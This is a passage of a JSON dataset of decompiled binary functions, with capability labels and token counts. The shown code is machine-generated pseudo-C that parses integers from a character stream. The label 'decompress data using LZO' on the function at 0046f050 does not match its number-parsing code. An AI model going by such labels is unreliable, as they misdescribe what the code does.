NULL;\n            }\n        }\n        cVar7 = *(iVar10 + 0x10);\n        iVar9 = uVar17;\n        bVar4 = *(iVar10 + 0x70) == iVar9;\n        if ((bVar4) || (*(iVar10 + 0x72) == iVar9)) {\n            if (((cVar7 == '\\0') || (*(iVar10 + 0x26) != iVar9)) && (*(iVar10 + 0x24) != iVar9)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00450410(&arg_10h);\n                if (var_42h != 0) {\n                    cVar7 = *(iVar10 + 0x10);\n                    uVar19 = 0;\n                    bVar14 = false;\n                    goto code_r0x0046e6ea;\n                }\n                uVar17 = fcn.00450500();\n                cVar7 = *(iVar10 + 0x10);\n            }\n        }\n        else {\n            bVar4 = false;\n        }\n        bVar14 = false;\n        uVar19 = 0;\n        do {\n            iVar9 = uVar17;\n            if ((cVar7 != '\\0') && (*(iVar10 + 0x26) == iVar9)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0046e6f7;\n                var_28h = var_28h & 0xffffff00;\n                stack0xffffffb0 = 0x16;\n                goto code_r0x0046edc0;\n            }\n            if (*(iVar10 + 0x24) == iVar9) break;\n            if (*(iVar10 + 0x78) == iVar9) {\n                bVar5 = var_40h == 10 | bVar14 ^ 1U;\n                if (!bVar5) goto code_r0x0046e652;\n                bVar14 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046e686;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar11 = arg_8h[2];\n                if (uVar11 < arg_8h[3]) goto code_r0x0046e695;\ncode_r0x0046e8e0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046e6a4;\n                var_44h._0_1_ = true;\n            }\n            else {\n                if (!bVar14) break;\ncode_r0x0046e652:\n                if ((*(iVar10 + 0x74) != iVar9) && (*(iVar10 + 0x76) != iVar9)) {\n                    var_42h = 0;\n                    bVar14 = true;\n                    goto code_r0x0046e6ea;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar14 = true;\n                    goto code_r0x0046e6f7;\n                }\n                bVar5 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0046e686:\n                uVar11 = arg_8h[2];\n                bVar14 = bVar5;\n                if (arg_8h[3] <= uVar11) goto code_r0x0046e8e0;\ncode_r0x0046e695:\n                arg_8h[2] = uVar11 + 2;\ncode_r0x0046e6a4:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar9 = *arg_8h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                }\n                var_44h._0_1_ = false;\n                if (iVar9 == -1) {\n                    arg_8h = NULL;\n                    var_44h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar8 = arg_10h != NULL && arg_14h == -1;\n            bVar5 = arg_14h == -1;\n            if (bVar8) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar9 = *arg_10h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_10h + 0x24))();\n                }\n                bVar5 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar5 = bVar8;\n                }\n            }\n            if (var_44h._0_1_ == bVar5) {\n                var_42h = 1;\n                cVar7 = *(iVar10 + 0x10);\n                goto code_r0x0046e6ea;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar7 = *(iVar10 + 0x10);\n        } while (bVar14);\n        var_42h = 0;\n    }\ncode_r0x0046e6ea:\n    stack0xffffffb0 = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0046e6f7:\n        stack0xffffffb0 = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar7 != '\\0') {\ncode_r0x0046edc0:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004b1bc0(0x20);\n    }\n    uVar16 = var_42h;\n    var_58h = &var_28h;\n    uVar2 = *(iVar10 + 0xa4);\n    var_54h._0_2_ = 0xffff / var_40h;\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_4fh._2_1_ = 0;\n            var_44h = 0;\ncode_r0x0046e756:\n            uVar15 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (stack0xffffffb0 < 0xb) {\n                if ((uVar15 < 0x30) || (stack0xffffffb0 + 0x30U <= uVar15)) goto code_r0x0046e990;\n            }\n            else if (9 < uVar15 - 0x30) goto code_r0x0046e96d;\n            iVar12 = uVar17 - 0x30;\ncode_r0x0046e77a:\n            if (iVar12 != -1) {\n                do {\n                    if (var_54h < var_44h) {\n                        var_4fh._2_1_ = 1;\n                        uVar18 = arg_8h[2];\n                        if (uVar18 < arg_8h[3]) goto code_r0x0046e7c5;\ncode_r0x0046ea53:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046e7d4;\n                        bVar5 = true;\n                    }\n                    else {\n                        var_4fh._2_1_ = var_4fh._2_1_ | 0xffff - iVar12 < var_44h * var_40h;\n                        var_44h = iVar12 + var_44h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar18 = arg_8h[2];\n                        if (arg_8h[3] <= uVar18) goto code_r0x0046ea53;\ncode_r0x0046e7c5:\n                        arg_8h[2] = uVar18 + 2;\ncode_r0x0046e7d4:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar5 = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            bVar5 = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar6 = arg_10h != NULL && arg_14h == -1;\n                    bVar8 = arg_14h == -1;\n                    if (bVar6) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar8 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar8 = bVar6;\n                        }\n                    }\n                    if (bVar5 == bVar8) {\n                        uVar2 = 1;\n                        goto code_r0x0046e81e;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0046e756;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar15 = uVar17;\n                    if (uVar15 != 0xffff) goto code_r0x0046e756;\n                    arg_8h = NULL;\n                    if (stack0xffffffb0 < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0046e96d:\n                    if (5 < uVar15 - 0x61) goto code_r0x0046eb30;\n                    iVar12 = uVar17 - 0x57;\n                    if (iVar12 == -1) break;\n                } while( true );\n            }\n            goto code_r0x0046e990;\n        }\n        var_4fh._2_1_ = 0;\n        var_42h = 0;\n        var_44h = 0;\n        uVar2 = uVar16;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar10 + 0x78;\n            var_4fh._2_1_ = 0;\n            var_44h = 0;\ncode_r0x0046eb6f:\n            uVar18 = var_2ch;\n            iVar9 = uVar17;\n            if ((*(iVar10 + 0x10) == 0) || (*(iVar10 + 0x26) != iVar9)) {\n                if (iVar9 == *(iVar10 + 0x24)) goto code_r0x0046e990;\n                iVar3 = *piVar1;\n                piVar13 = piVar1;\n                uVar18 = stack0xffffffb0;\n                while (iVar3 != iVar9) {\n                    piVar13 = piVar13 + 1;\n                    uVar18 = uVar18 - 1;\n                    if (uVar18 == 0) goto code_r0x0046e990;\n                    iVar3 = *piVar13;\n                }\n                iVar12 = piVar13 - piVar1 >> 1;\n                if (0x1e < piVar13 - piVar1) {\n                    iVar12 = iVar12 + -6;\n                }\n                if (var_44h <= var_54h) {\n                    uVar15 = var_44h * var_40h;\n                    var_44h = iVar12 + uVar15;\n                    var_4fh._2_1_ = var_4fh._2_1_ | 0xffff - iVar12 < uVar15;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046ebc2;\n                }\n                uVar18 = arg_8h[2];\n                var_4fh._2_1_ = uVar2;\n                if (uVar18 < arg_8h[3]) goto code_r0x0046ebd1;\ncode_r0x0046ec9a:\n                (**(*arg_8h + 0x28))();\n                uVar16 = uVar2;\n                if (arg_8h != NULL) goto code_r0x0046ebe0;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar10 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0046e81e;\n                }\n                uVar17 = var_2ch + 1;\n                uVar11 = 0xf;\n                if (stack0xffffffcc != var_58h) {\n                    uVar11 = var_28h;\n                }\n                if (uVar11 < uVar17) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar18) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0046ebc2:\n                uVar18 = arg_8h[2];\n                if (arg_8h[3] <= uVar18) goto code_r0x0046ec9a;\ncode_r0x0046ebd1:\n                arg_8h[2] = uVar18 + 2;\ncode_r0x0046ebe0:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar9 = *arg_8h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                }\n                uVar16 = 0;\n                if (iVar9 == -1) {\n                    arg_8h = NULL;\n                    uVar16 = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar8 = arg_10h != NULL && arg_14h == -1;\n            bVar5 = arg_14h == -1;\n            if (bVar8) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar9 = *arg_10h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_10h + 0x24))();\n                }\n                bVar5 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar5 = bVar8;\n                }\n            }\n            if (bVar5 == uVar16) goto code_r0x0046e81e;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0046eb6f;\n        }\n        var_4fh._2_1_ = 0;\n        var_42h = 0;\n        var_44h = 0;\n        uVar2 = uVar16;\n    }\ncode_r0x0046e81e:\n    if (var_2ch != 0) goto code_r0x0046e9a2;\ncode_r0x0046e830:\n    if ((uVar19 != 0) || (bVar14)) {\ncode_r0x0046ea0b:\n        if (var_42h == 0) {\n            if (var_4fh._2_1_ == 0) {\n                uVar15 = -var_44h;\n                if (!bVar4) {\n                    uVar15 = var_44h;\n                }\n                *arg_20h = uVar15;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046e853;\n        }\n    }\ncode_r0x0046e842:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0046e853:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_58h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0046eb30:\n    if (5 < uVar15 - 0x41) goto code_r0x0046e990;\n    iVar12 = uVar17 - 0x37;\n    goto code_r0x0046e77a;\ncode_r0x0046e990:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0046e830;\ncode_r0x0046e9a2:\n    uVar17 = var_2ch;\n    uVar18 = var_2ch + 1;\n    uVar11 = 0xf;\n    if (stack0xffffffcc != var_58h) {\n        uVar11 = var_28h;\n    }\n    if (uVar11 < uVar18) {\n        fcn.004b1f10(var_2ch, 0, 0, 1);\n    }\n    *(stack0xffffffcc + uVar17) = uVar19;\n    *(stack0xffffffcc + uVar18) = 0;\n    var_2ch = uVar18;\n    cVar7 = fcn.004bdf20(*(iVar10 + 8), *(iVar10 + 0xc), &var_31h + 1);\n    if (cVar7 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar14) || ((uVar19 | var_2ch) != 0)) goto code_r0x0046ea0b;\n    goto code_r0x0046e842;\n}\n",
        "token_count": 5302
    },
    "0046f050": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046f050(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint *var_70h;\n    uint var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    char var_42h;\n    char var_41h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar7 = arg_18h;\n    iVar4 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar5 = *(iVar7 + 0xc) & 0x4a;\n    if (uVar5 == 0x40) {\n        var_50h = 8;\ncode_r0x0046f090:\n        var_42h = fcn.00450410(&arg_10h);\n        if (var_42h == '\\0') {\ncode_r0x0046f0ac:\n            uVar11 = arg_ch & 0xffff;\n            if ((arg_8h != NULL) && (arg_ch == -1)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar11 = *arg_8h[2];\n                }\n                else {\n                    uVar11 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar11 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar2 = *(iVar4 + 0x10);\n            iVar3 = uVar11;\n            bVar15 = *(iVar4 + 0x70) == iVar3;\n            if ((((bVar15) || (*(iVar4 + 0x72) == iVar3)) && ((cVar2 == '\\0' || (*(iVar4 + 0x26) != iVar3)))) &&\n               (*(iVar4 + 0x24) != iVar3)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00450410(&arg_10h);\n                if (var_42h == '\\0') {\n                    uVar11 = fcn.00450500();\n                    cVar2 = *(iVar4 + 0x10);\n                    goto code_r0x0046f150;\n                }\n                var_48h = 0;\n                var_41h = false;\n                cVar2 = *(iVar4 + 0x10);\n            }\n            else {\ncode_r0x0046f150:\n                var_48h = 0;\n                var_41h = false;\n                do {\n                    iVar3 = uVar11;\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x26) == iVar3)) {\n                        var_42h = '\\0';\n                        if (var_50h != 0x10) goto code_r0x0046f23d;\n                        var_28h = var_28h & 0xffffff00;\n                        var_54h = 0x16;\n                        goto code_r0x0046fa12;\n                    }\n                    if (*(iVar4 + 0x24) == iVar3) break;\n                    if (*(iVar4 + 0x78) == iVar3) {\n                        var_41h = var_50h == 10 | var_41h ^ 1U;\n                        if (var_41h == false) goto code_r0x0046f192;\n                        bVar13 = var_50h == 8 || uVar5 == 0;\n                        if (var_50h != 8 && uVar5 != 0) {\n                            var_48h = var_48h + 1;\n                            goto code_r0x0046f1cb;\n                        }\n                        var_48h = 0;\n                        var_50h = 8;\n                        uVar12 = arg_8h[2];\n                        var_41h = bVar13;\n                        if (arg_8h[3] <= uVar12) {\n                            var_50h = 8;\n                            goto code_r0x0046f4f0;\n                        }\ncode_r0x0046f1da:\n                        arg_8h[2] = uVar12 + 2;\ncode_r0x0046f1e9:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar3 = *arg_8h[2];\n                        }\n                        else {\n                            iVar3 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar13 = false;\n                        if (iVar3 == -1) {\n                            arg_8h = NULL;\n                            bVar13 = true;\n                        }\n                    }\n                    else {\n                        if (var_41h == false) break;\ncode_r0x0046f192:\n                        if ((*(iVar4 + 0x74) != iVar3) && (*(iVar4 + 0x76) != iVar3)) {\n                            var_42h = '\\0';\n                            var_41h = true;\n                            goto code_r0x0046f231;\n                        }\n                        var_42h = var_50h == 0x10 || uVar5 == 0;\n                        if (var_50h != 0x10 && uVar5 != 0) {\n                            var_41h = true;\n                            goto code_r0x0046f23d;\n                        }\n                        var_48h = 0;\n                        var_50h = 0x10;\n                        var_41h = false;\ncode_r0x0046f1cb:\n                        uVar12 = arg_8h[2];\n                        if (uVar12 < arg_8h[3]) goto code_r0x0046f1da;\ncode_r0x0046f4f0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046f1e9;\n                        bVar13 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if (bVar9) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar3 = *arg_10h[2];\n                        }\n                        else {\n                            iVar3 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar1 = false;\n                        if (iVar3 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar9;\n                        }\n                    }\n                    if (bVar1 == bVar13) {\n                        var_42h = '\\x01';\n                        cVar2 = *(iVar4 + 0x10);\n                        goto code_r0x0046f231;\n                    }\n                    uVar11 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar11 == -1) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    cVar2 = *(iVar4 + 0x10);\n                } while (var_41h != false);\n                var_42h = '\\0';\n            }\ncode_r0x0046f231:\n            var_54h = 0x16;\n            if (var_50h != 0x10) goto code_r0x0046f23d;\n        }\n        else {\n            uVar11 = 0;\n            var_48h = 0;\n            var_41h = false;\n            cVar2 = *(iVar4 + 0x10);\n            bVar15 = false;\ncode_r0x0046f23d:\n            var_54h = var_50h;\n        }\n        unique0x00001d00 = &var_28h;\n        var_2ch = 0;\n        var_28h = var_28h & 0xffffff00;\n        if (cVar2 != '\\0') {\ncode_r0x0046fa12:\n            stack0xffffffcc = &var_28h;\n            var_2ch = 0;\n            fcn.004b1bc0(0x20);\n        }\n        var_68h = 0;\n        var_64h = -0x80000000;\n        if (!bVar15) {\n            var_68h = 0xffffffff;\n            var_64h = 0x7fffffff;\n        }\n        uVar16 = fcn.00437f00(var_68h, var_64h, var_50h, 0);\n        uVar5 = uVar16 >> 0x20;\n        if (*(iVar4 + 0xa4) == '\\0') {\n            if (var_42h == '\\0') {\n                bVar13 = false;\n                uVar12 = 0;\n                uVar14 = 0;\ncode_r0x0046f2d4:\n                uVar10 = uVar11;\n                uVar11 = uVar11 & 0xffff;\n                if (var_54h < 0xb) {\n                    if ((uVar10 < 0x30) || (var_54h + 0x30U <= uVar10)) goto code_r0x0046f5b2;\n                }\n                else if (9 < uVar10 - 0x30) goto code_r0x0046f58d;\n                uVar8 = uVar11 - 0x30;\ncode_r0x0046f2f8:\n                if (uVar8 != 0xffffffff) {\n                    do {\n                        if (uVar5 < uVar14 || uVar5 - uVar14 < (uVar16 < uVar12)) {\n                            bVar13 = true;\n                            uVar11 = arg_8h[2];\n                            if (arg_8h[3] <= uVar11) goto code_r0x0046f663;\ncode_r0x0046f358:\n                            arg_8h[2] = uVar11 + 2;\ncode_r0x0046f367:\n                            if (arg_8h[2] < arg_8h[3]) {\n                                iVar3 = *arg_8h[2];\n                            }\n                            else {\n                                iVar3 = (**(*arg_8h + 0x24))();\n                            }\n                            var_58h._0_1_ = false;\n                            if (iVar3 == -1) {\n                                arg_8h = NULL;\n                                var_58h._0_1_ = true;\n                            }\n                        }\n                        else {\n                            uVar11 = uVar12 * var_50h;\n                            uVar14 = (uVar12 * var_50h >> 0x20) + var_50h * uVar14;\n                            uVar12 = (var_64h - (uVar8 >> 0x1f)) - (var_68h < uVar8);\n                            bVar13 = bVar13 | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar8 < uVar11));\n                            uVar12 = uVar11 + uVar8;\n                            uVar14 = uVar14 + (uVar8 >> 0x1f) + CARRY4(uVar11, uVar8);\n                            var_48h = var_48h + 1;\n                            uVar11 = arg_8h[2];\n                            if (uVar11 < arg_8h[3]) goto code_r0x0046f358;\ncode_r0x0046f663:\n                            (**(*arg_8h + 0x28))();\n                            if (arg_8h != NULL) goto code_r0x0046f367;\n                            var_58h._0_1_ = true;\n                        }\n                        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                        bVar9 = arg_10h != NULL && arg_14h == -1;\n                        bVar1 = arg_14h == -1;\n                        if (bVar9) {\n                            if (arg_10h[2] < arg_10h[3]) {\n                                iVar3 = *arg_10h[2];\n                            }\n                            else {\n                                iVar3 = (**(*arg_10h + 0x24))();\n                            }\n                            bVar1 = false;\n                            if (iVar3 == -1) {\n                                arg_10h = NULL;\n                                bVar1 = bVar9;\n                            }\n                        }\n                        if (var_58h._0_1_ == bVar1) goto code_r0x0046f3a5;\n                        uVar11 = 0xffff;\n                        if (arg_8h == NULL) goto code_r0x0046f2d4;\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                        }\n                        uVar10 = uVar11;\n                        if (uVar10 != 0xffff) goto code_r0x0046f2d4;\n                        arg_8h = NULL;\n                        if (var_54h < 0xb) break;\n                        uVar11 = 0xffff;\ncode_r0x0046f58d:\n                        uVar8 = uVar11 - 0x57;\n                        if (uVar10 - 0x61 < 6) goto code_r0x0046f2f8;\n                        if ((5 < uVar10 - 0x41) || (uVar8 = uVar11 - 0x37,  uVar8 == 0xffffffff)) break;\n                    } while( true );\n                }\n                goto code_r0x0046f5b2;\n            }\n            goto code_r0x0046f481;\n        }\ncode_r0x0046f790:\n        var_50h._0_1_ = var_42h;\n        var_60h = uVar16 >> 0x20;\n        var_5ch = uVar16;\n        var_70h = &var_28h;\n        if (var_42h == '\\0') {\n            bVar13 = false;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x0046f7ab:\n            uVar5 = var_2ch;\n            iVar3 = uVar11;\n            if ((*(iVar4 + 0x10) == '\\0') || (*(iVar4 + 0x26) != iVar3)) {\n                piVar6 = iVar4 + 0x78;\n                uVar5 = var_54h;\n                if (iVar3 == *(iVar4 + 0x24)) goto code_r0x0046f5b2;\n                while (*piVar6 != iVar3) {\n                    uVar5 = uVar5 - 1;\n                    piVar6 = piVar6 + 1;\n                    if (uVar5 == 0) {\n                        var_50h._0_1_ = '\\0';\n                        goto code_r0x0046f3ac;\n                    }\n                }\n                iVar7 = piVar6 - (iVar4 + 0x78);\n                uVar11 = iVar7 >> 1;\n                uVar5 = uVar11 - 6;\n                if (iVar7 < 0x1f) {\n                    uVar5 = uVar11;\n                }\n                if (uVar14 <= var_60h && (var_5ch < uVar12) <= var_60h - uVar14) {\n                    uVar11 = uVar12 * var_50h;\n                    uVar14 = (uVar12 * var_50h >> 0x20) + var_50h * uVar14;\n                    uVar12 = (var_64h - (uVar5 >> 0x1f)) - (var_68h < uVar5);\n                    bVar13 = bVar13 | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar5 < uVar11));\n                    uVar12 = uVar11 + uVar5;\n                    uVar14 = uVar14 + (uVar5 >> 0x1f) + CARRY4(uVar11, uVar5);\n                    var_48h = var_48h + 1;\n                    goto code_r0x0046f80d;\n                }\n                bVar13 = true;\n                uVar5 = arg_8h[2];\n                if (arg_8h[3] <= uVar5) goto code_r0x0046f920;\ncode_r0x0046f81c:\n                arg_8h[2] = uVar5 + 2;\ncode_r0x0046f82b:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar3 = *arg_8h[2];\n                }\n                else {\n                    iVar3 = (**(*arg_8h + 0x24))();\n                }\n                var_58h._0_1_ = false;\n                if (iVar3 == -1) {\n                    arg_8h = NULL;\n                    var_58h._0_1_ = true;\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_50h._0_1_ = '\\0';\n                    var_42h = *(iVar4 + 0x10);\n                    goto code_r0x0046f3ac;\n                }\n                uVar11 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != var_70h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar11) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar11) = 0;\n                var_2ch = uVar11;\ncode_r0x0046f80d:\n                uVar5 = arg_8h[2];\n                if (uVar5 < arg_8h[3]) goto code_r0x0046f81c;\ncode_r0x0046f920:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046f82b;\n                var_58h._0_1_ = true;\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if (bVar9) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar3 = *arg_10h[2];\n                }\n                else {\n                    iVar3 = (**(*arg_10h + 0x24))();\n                }\n                bVar1 = false;\n                if (iVar3 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar9;\n                }\n            }\n            if (bVar1 != var_58h._0_1_) {\n                uVar11 = 0xffff;\n                if (arg_8h != NULL) {\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar11 = *arg_8h[2];\n                    }\n                    else {\n                        uVar11 = (**(*arg_8h + 0x24))();\n                    }\n                    if (uVar11 == -1) {\n                        arg_8h = NULL;\n                    }\n                }\n                goto code_r0x0046f7ab;\n            }\ncode_r0x0046f3a5:\n            var_50h._0_1_ = '\\x01';\n        }\n        else {\n            uVar12 = 0;\n            uVar14 = 0;\n            bVar13 = false;\n            var_42h = '\\0';\n        }\n    }\n    else {\n        var_50h = 10;\n        if (uVar5 != 8) goto code_r0x0046f090;\n        var_50h = 0x10;\n        cVar2 = fcn.00450410(&arg_10h);\n        if (cVar2 == '\\0') goto code_r0x0046f0ac;\n        unique0x00001d00 = &var_28h;\n        var_2ch = 0;\n        var_42h = *(iVar4 + 0x10);\n        var_28h = var_28h & 0xffffff00;\n        if (var_42h != '\\0') {\n            uVar11 = 0;\n            var_48h = 0;\n            var_41h = false;\n            bVar15 = false;\n            var_54h = 0x16;\n            goto code_r0x0046fa12;\n        }\n        var_42h = *(iVar4 + 0xa4);\n        bVar15 = false;\n        if (var_42h != '\\0') {\n            var_48h = 0;\n            uVar11 = 0;\n            var_41h = false;\n            uVar16 = 0x7ffffffffffffff;\n            var_68h = 0xffffffff;\n            var_64h = 0x7fffffff;\n            var_50h = 0x10;\n            var_54h = 0x16;\n            goto code_r0x0046f790;\n        }\n        var_48h = 0;\n        var_41h = var_42h;\ncode_r0x0046f481:\n        uVar12 = 0;\n        uVar14 = 0;\n        bVar13 = false;\n        var_42h = '\\0';\n        var_50h._0_1_ = '\\x01';\n    }\ncode_r0x0046f3ac:\n    if (var_2ch == 0) goto code_r0x0046f3b4;\ncode_r0x0046f5c1:\n    fcn.004b20a0(var_48h);\n    cVar2 = fcn.004bdf20(*(iVar4 + 8), *(iVar4 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (var_41h == '\\0') {\n        var_48h = var_48h | var_2ch;\n        goto joined_r0x0046f3c3;\n    }\ncode_r0x0046f608:\n    if (var_42h == '\\0') {\n        if (bVar13) {\n            uVar5 = 0;\n            uVar11 = 0x80000000;\n            if (!bVar15) {\n                uVar5 = 0xffffffff;\n                uVar11 = 0x7fffffff;\n            }\n            *arg_20h = uVar5;\n            arg_20h[1] = uVar11;\n            *arg_1ch = 4;\n        }\n        else {\n            if (bVar15) {\n                bVar15 = uVar12 != 0;\n                uVar12 = -uVar12;\n                uVar14 = -(uVar14 + bVar15);\n            }\n            *arg_20h = uVar12;\n            arg_20h[1] = uVar14;\n        }\n        goto code_r0x0046f3e2;\n    }\n    goto code_r0x0046f3c9;\ncode_r0x0046f5b2:\n    var_50h._0_1_ = '\\0';\n    if (var_2ch != 0) goto code_r0x0046f5c1;\ncode_r0x0046f3b4:\n    if (var_41h == '\\x01') goto code_r0x0046f608;\njoined_r0x0046f3c3:\n    if (var_48h != 0) goto code_r0x0046f608;\ncode_r0x0046f3c9:\n    *arg_20h = 0;\n    arg_20h[1] 